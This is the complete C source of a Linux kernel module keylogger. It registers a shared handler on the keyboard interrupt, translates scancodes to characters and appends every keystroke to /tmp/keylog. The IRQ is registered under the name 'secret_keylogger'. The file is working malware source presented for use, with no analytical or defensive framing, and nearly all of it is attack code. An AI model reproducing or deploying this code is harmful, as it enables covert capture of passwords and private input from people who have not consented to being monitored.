/*
 * A Linux kernel module that registers a keyboard IRQ, translates received scancodes to their corresponding ascii characters,
 * and logs the keystrokes to a file.
 */
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/interrupt.h>
#include <asm/io.h>
#include <linux/fs.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>
#include <linux/string.h>
#include <linux/version.h>

#define KB_IRQ 1

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 14, 0)
#define VFS_WRITE kernel_write
#else
#define VFS_WRITE vfs_write
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 0, 0)
#define uaccess_begin \
            mm_segment_t old_fs = get_fs(); \
            set_fs( get_ds() );
#elif LINUX_VERSION_CODE < KERNEL_VERSION(5,10,0)
#define uaccess_begin \
            mm_segment_t old_fs = get_fs(); \
            set_fs( KERNEL_DS );
#else
#define uaccess_begin \
            mm_segment_t old_fs = force_uaccess_begin();
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(5,10,0)
#define uaccess_end \
            set_fs(old_fs);
#else
#define uaccess_end \
            force_uaccess_end(old_fs);
#endif

/* =================================================================== */

loff_t log_offset;

/* Opens a file from kernel space. */
struct file* log_open(const char *path, int flags, int rights)
{
	struct file *fp = NULL;
	int error = 0;

	uaccess_begin

	fp = filp_open(path, flags, rights);

	uaccess_end

	if(IS_ERR(fp)){
		/* Debugging... */
		error = PTR_ERR(fp);
		printk("log_open(): ERROR = %d", error);
		return NULL;
	}

	return fp;
}

/* Closes file handle. */
void log_close(struct file *fp)
{
	filp_close(fp, NULL);
}

/* Writes buffer to file from kernel space. */
int log_write(struct file *fp, unsigned char *data,
		unsigned int size)
{
	int ret;

	uaccess_begin

	ret = VFS_WRITE(fp, data, size, &log_offset);
	/* Increase file offset, preparing for next write operation. */
	log_offset += size;

	uaccess_end

	return ret;
}

/* =================================================================== */

/* Converts scancode to key. */
void sc_to_ascii(unsigned char scancode, char *buf)
{
	static int shift = 0;

	switch(scancode){
		default: 
            printk(KERN_INFO "Default switch case\n");
			return;

		case 1:
			strcpy(buf, "(ESC)"); break;

		case 2:
			strcpy(buf, (shift) ? "!" : "1"); break;

		case 3:
			strcpy(buf, (shift) ? "@" : "2"); break;

		case 4:
			strcpy(buf, (shift) ? "#" : "3"); break;
		
		case 5:
			strcpy(buf, (shift) ? "$" : "4"); break;

		case 6:
			strcpy(buf, (shift) ? "%" : "5"); break;

		case 7:
			strcpy(buf, (shift) ? "^" : "6"); break;

		case 8:
			strcpy(buf, (shift) ? "&" : "7"); break;

		case 9:
			strcpy(buf, (shift) ? "*" : "8"); break;

		case 10:
			strcpy(buf, (shift) ? "(" : "9"); break;

		case 11:
			strcpy(buf, (shift) ? ")" : "0"); break;

		case 12:
			strcpy(buf, (shift) ? "_" : "-"); break;

		case 13:
			strcpy(buf, (shift) ? "+" : "="); break;

		case 14:
			strcpy(buf, "(BACK)"); break;

		case 15:
			strcpy(buf, "(TAB)"); break;

		case 16:
			strcpy(buf, (shift) ? "Q" : "q"); break;

		case 17:
			strcpy(buf, (shift) ? "W" : "w"); break;

		case 18:
			strcpy(buf, (shift) ? "E" : "e"); break;

		case 19:
			strcpy(buf, (shift) ? "R" : "r"); break;

		case 20:
			strcpy(buf, (shift) ? "T" : "t"); break;

		case 21:
			strcpy(buf, (shift) ? "Y" : "y"); break;

		case 22:
			strcpy(buf, (shift) ? "U" : "u"); break;

		case 23:
			strcpy(buf, (shift) ? "I" : "i"); break;

		case 24:
			strcpy(buf, (shift) ? "O" : "o"); break;

		case 25:
			strcpy(buf, (shift) ? "P" : "p"); break;

		case 26:
			strcpy(buf, (shift) ? "{" : "["); break;

		case 27:
			strcpy(buf, (shift) ? "}" : "]"); break;

		case 28:
			strcpy(buf, "(ENTER)"); break;

		case 29:
			strcpy(buf, "(CTRL)"); break;

		case 30:
			strcpy(buf, (shift) ? "A" : "a"); break;

		case 31:
			strcpy(buf, (shift) ? "S" : "s"); break;

		case 32:
			strcpy(buf, (shift) ? "D" : "d"); break;

		case 33:
			strcpy(buf, (shift) ? "F" : "f"); break;
	
		case 34:
			strcpy(buf, (shift) ? "G" : "g"); break;

		case 35:
			strcpy(buf, (shift) ? "H" : "h"); break;

		case 36:
			strcpy(buf, (shift) ? "J" : "j"); break;

		case 37:
			strcpy(buf, (shift) ? "K" : "k"); break;

		case 38:
			strcpy(buf, (shift) ? "L" : "l"); break;
	
		case 39:
			strcpy(buf, (shift) ? ":" : ";"); break;

		case 40:
			strcpy(buf, (shift) ? "\"" : "'"); break;

		case 41:
			strcpy(buf, (shift) ? "~" : "`"); break;

		case 42:
		case 54:
			shift = 1; break;

		case 170:
		case 182:
			shift = 0; break;

		case 44:
			strcpy(buf, (shift) ? "Z" : "z"); break;
		
		case 45:
			strcpy(buf, (shift) ? "X" : "x"); break;

		case 46:
			strcpy(buf, (shift) ? "C" : "c"); break;

		case 47:
			strcpy(buf, (shift) ? "V" : "v"); break;
		
		case 48:
			strcpy(buf, (shift) ? "B" : "b"); break;

		case 49:
			strcpy(buf, (shift) ? "N" : "n"); break;

		case 50:
			strcpy(buf, (shift) ? "M" : "m"); break;

		case 51:
			strcpy(buf, (shift) ? "<" : ","); break;

		case 52:
			strcpy(buf, (shift) ? ">" : "."); break;
	
		case 53:
			strcpy(buf, (shift) ? "?" : "/"); break;

		case 56:
			strcpy(buf, "(R-ALT)"); break;
	
		/* Space */
		case 55:
		case 57:
		case 58:
		case 59:
		case 60:
		case 61:
		case 62:
		case 63:
		case 64:
		case 65:
		case 66:
		case 67:
		case 68:
		case 70:
		case 71:
		case 72:
			strcpy(buf, " "); break;

		case 83:
			strcpy(buf, "(DEL)"); break;
	}
}

unsigned char scancode;
struct file* log_fp;

void tasklet_func(unsigned long data)
{
    char scancode_ascii[32];
    memset(scancode_ascii, 0, sizeof(scancode_ascii));

    sc_to_ascii(scancode, scancode_ascii);

    printk(KERN_INFO "Recevied keystroke %s\n", scancode_ascii);

    log_write(log_fp, scancode_ascii, sizeof(scancode_ascii));
}

/* Registers the tasklet for logging keys. */
#if LINUX_VERSION_CODE < KERNEL_VERSION(5,9,0)
DECLARE_TASKLET(logger_tasklet, tasklet_func, 0);
#else
DECLARE_TASKLET_OLD(logger_tasklet, tasklet_func);
#endif

/* ISR for keyboard IRQ. */
irq_handler_t logger_irq_handler(int irq, void *dev_id, struct pt_regs *regs)
{
	/* Set global value to the received scancode. */
	scancode = inb(0x60);

	/* We want to avoid I/O in an ISR, so schedule a Linux tasklet to
	 * write the key to the log file at the next available time in a 
	 * non-atomic context.
	 */
	tasklet_schedule(&logger_tasklet);
	
	return (irq_handler_t)IRQ_HANDLED;
}

static int __init logger_init(void)
{
	int ret;

	/* Open log file as write only, create if it doesn't exist. */
	log_fp = log_open("/tmp/keylog", O_WRONLY | O_CREAT, 0644);
	if(IS_ERR(log_fp)){
		printk(KERN_INFO "FAILED to open log file.\n");
		return 1;
	}

    /* Log file opened, print debug message. */
		printk(KERN_INFO "SUCCESSFULLY opened log file.\n");

	/* Request to register a shared IRQ handler (ISR). */
	ret = request_irq(KB_IRQ, (irq_handler_t)logger_irq_handler, IRQF_SHARED,
			"secret_keylogger", &scancode);
	if(ret != 0){
		printk(KERN_INFO "FAILED to request IRQ for keyboard.\n");
	}

	return ret;
}

static void __exit logger_exit(void)
{
    /* Free the logging tasklet. */
	tasklet_kill(&logger_tasklet);

	/* Free the shared IRQ handler, giving system back original control. */
	free_irq(KB_IRQ, &scancode);

	/* Close log file handle. */
	if(log_fp != NULL){
		log_close(log_fp);
	}
}

MODULE_LICENSE("GPL");
module_init(logger_init);
module_exit(logger_exit);
